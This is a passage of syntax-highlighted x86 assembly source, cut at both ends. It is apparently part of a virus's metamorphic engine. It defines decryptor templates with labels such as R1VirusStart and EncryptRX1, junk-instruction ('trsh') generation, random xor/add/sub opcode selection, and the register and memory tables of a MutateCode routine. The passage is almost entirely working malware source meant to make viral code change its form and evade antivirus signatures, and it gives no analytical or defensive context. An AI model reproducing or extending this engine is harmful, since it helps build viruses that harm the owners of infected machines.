        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; How many bytes to output</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                           
                                        
 </span><span class="sc5">ParseCall</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">; end of this function, </span><span class="sc0">
                                                </span><span class="sc1">; should we call an other</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ReturnFromCall</span><span class="sc0">                  </span><span class="sc1">; no, return</span><span class="sc0">


        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                 
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">; push return address</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; address of the function</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ReadInstruction</span><span class="sc0">                 </span><span class="sc1">; jmp to function 'executer'</span><span class="sc0">

     </span><span class="sc5">ReturnFromCall</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; return from main function</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">ParseCall</span><span class="sc0">

     </span><span class="sc5">NoMoreParsing</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

  </span><span class="sc5">Decryptor</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">R0VSize</span><span class="sc0">
</span><span class="sc1">;                dd      R0Zero</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">MovePoinerToProgramStart</span><span class="sc0">



                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">MovePoinerToProgramStart</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">MovePoinerToProgramStartEnd</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"trsh"</span><span class="sc4">,</span><span class="sc5">LinesOfTrash</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"mov R1,[N"</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"]"</span><span class="sc0">

        </span><span class="sc5">MovePoinerToProgramStartEnd</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


        </span><span class="sc5">R0VSize</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">R0VSizeEnd</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"mov RX0,N"</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">VSize</span><span class="sc0">
        </span><span class="sc5">R0VSizeEnd</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">R1VirusStart</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">R1VirusEnd</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">EncryptRX1</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">SubR0AndJump</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">SubR0AndJump</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">SubR0AndJumpEnd</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"db  "</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">; Bytes not to be morphed</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"trsh"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"sub RX0,N"</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">4</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"!emu"</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">                </span><span class="sc1">; dont do anything about this</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"jnb N"</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">SubR0AndJumpEnd</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">R0Zero</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">R0ZeroEnd</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"mov RX0,N"</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">R0ZeroEnd</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">R1VirusStart</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">R1VirusEnd</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">EncryptRX1</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">AddR0AndJump</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


        </span><span class="sc5">AddR0AndJump</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">AddR0AndJumpEnd</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"db  "</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">; Bytes not to be morphed</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"add RX0,N"</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">4</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"trsh"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"!emu"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">               </span><span class="sc1">; dont do anything about this</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"cmp RX0,N"</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">VSize</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"!emu"</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">                </span><span class="sc1">; dont do anything about this</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"jna N"</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">AddR0AndJumpEnd</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">



        </span><span class="sc5">R1VirusStart</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">R1VirusStartEnd</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"mov RX1,[N"</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"]"</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"ofs 0"</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"db  "</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"nfo RX2"</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Undefined</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"add RX1,RX0"</span><span class="sc0">

        </span><span class="sc5">R1VirusStartEnd</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">



        </span><span class="sc5">R1VirusEnd</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">R1VirusEndEnd</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"mov RX1,[N"</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"]"</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"add RX1,N"</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">VSize</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"ofs 0"</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"db  "</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"nfo RX2"</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Undefined</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"sub RX1,RX0"</span><span class="sc0">
        </span><span class="sc5">R1VirusEndEnd</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


        </span><span class="sc5">EncryptRX1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">RandomReg</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


        </span><span class="sc5">OpcodeXor</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"xor "</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">OpcodeAdd</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"add "</span><span class="sc0"> 
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">OpcodeSub</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"sub "</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">RandomReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">RandomOpcode</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">RandomizeMemWithReg</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">RandomizeMemWithReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">RandomizeMemWithRegEnd</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"[RX1],N"</span><span class="sc0">      
</span><span class="sc5">RandomNumber</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">RandomizeMemWithRegEnd</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">



        </span><span class="sc5">RandomOpcode</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">OpcodeXor</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">OpcodeAdd</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">OpcodeSub</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">





</span><span class="sc5">Guide</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">DefinedTrash</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"trsh"</span><span class="sc4">,</span><span class="sc5">LinesOfTrash</span><span class="sc0">
     </span><span class="sc5">DefinedTrash</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc1">;                dd      RandomEveryBoot</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">RandomEveryTime</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">MakeZeroOrEight</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


            </span><span class="sc5">RandomEveryTime</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">RandomEveryTimeEnd</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"pfx "</span><span class="sc4">,</span><span class="sc2">64h</span><span class="sc0">              </span><span class="sc1">; prefix fs:</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"mov RX0,[N"</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">PointerToRandomMemory</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"]"</span><span class="sc0">                     </span><span class="sc1">; mov X0, fs:[0ch]</span><span class="sc0">
            </span><span class="sc5">RandomEveryTimeEnd</span><span class="sc4">:</span><span class="sc0">    
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

            </span><span class="sc5">RandomEveryBoot</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">RandomEveryBootEnd</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"nfo R"</span><span class="sc0">
            </span><span class="sc5">RandomEveryBootEnd</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">RndEcx</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">RndEdi</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">RndEsi</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

            </span><span class="sc5">RndEcx</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">RndEcxEnd</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"3"</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Undefined</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"mov RX0,R3"</span><span class="sc0">
            </span><span class="sc5">RndEcxEnd</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


            </span><span class="sc5">RndEdi</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">RndEdiEnd</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"5"</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Undefined</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"mov RX0,R5"</span><span class="sc0">
            </span><span class="sc5">RndEdiEnd</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

            </span><span class="sc5">RndEsi</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">RndEsiEnd</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"6"</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Undefined</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"mov RX0,R6"</span><span class="sc0">
            </span><span class="sc5">RndEsiEnd</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">MakeZeroOrEight</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">MakeZeroOrEight</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"and RX0,N"</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"add RX0,[N"</span><span class="sc0">            </span><span class="sc1">; special variable 1 =</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">                       </span><span class="sc1">; pointer to jump table</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"]"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"jmp [RX0]"</span><span class="sc0">             </span><span class="sc1">; jmp [X0]</span><span class="sc0">
        </span><span class="sc5">MakeZeroOrEightEnd</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">














































</span><span class="sc1">; ---------------------------------------------</span><span class="sc0">
</span><span class="sc1">; ---------------- MutateCode -----------------</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------</span><span class="sc0">
</span><span class="sc1">; ------------- Local variables</span><span class="sc0">

        </span><span class="sc5">Prefix</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

      </span><span class="sc5">EndWhere</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">Trash</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">ToReg</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">ToMemValue</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">ToMemReg</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

      </span><span class="sc5">FromWhere</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">FromValue</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">FromReg</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">FromMemValue</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">FromMemReg</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

      </span><span class="sc5">TempWhere</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">TempValue</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">TempReg</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">TestMemValue</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">TestMemReg</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">Temp1</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">Temp2</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">Writeable</span><span class="sc0">                       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1b</span><span class="sc0">
</span><span class="sc5">Undefined</span><span class="sc0">                       </span><span class="sc9">equ</span><span class="sc0">    </span><span class="sc2">10b</span><span class="sc0">      </span><span class="sc1">; is has a unknown value</span><span class="sc0">
</span><span class="sc5">Uninitialized</span><span class="sc0">                   </span><span class="sc9">equ</span><span class="sc0">    </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">TableSize</span><span class="sc0">                       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">EbxTable</span><span class="sc4">-</span><span class="sc5">EaxTable</span><span class="sc0">

        </span><span class="sc5">EndValue</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       
        </span><span class="sc5">EndTypeOfValue</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


   </span><span class="sc5">Tables</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">; pointers to the different</span><span class="sc0">
                                                </span><span class="sc1">; tables</span><span class="sc0">
        </span><span class="sc5">RegTables</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">EaxTable</span><span class="sc0">
        </span><span class="sc5">MemoryTables</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Is allocated later</span><span class="sc0">
        </span><span class="sc5">StackTables</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; first table is EspTable</span><span class="sc0">

   </span><span class="sc5">EaxTable</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">EaxValueNumber</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">EaxValueReg</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">EaxMemoryNumber</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">EaxMemoryReg</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">EaxInformation</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Undefined</span><span class="sc4">+</span><span class="sc5">Writeable</span><span class="sc0">

   </span><span class="sc5">EbxTable</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Undefined</span><span class="sc4">+</span><span class="sc5">Writeable</span><span class="sc0">      
   </span><span class="sc5">EcxTable</span><span class="sc4">:</span><span class="sc0">                           
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Undefined</span><span class="sc4">+</span><span class="sc5">Writeable</span><span class="sc0">      
   </span><span class="sc5">EdxTable</span><span class="sc4">:</span><span class="sc0">
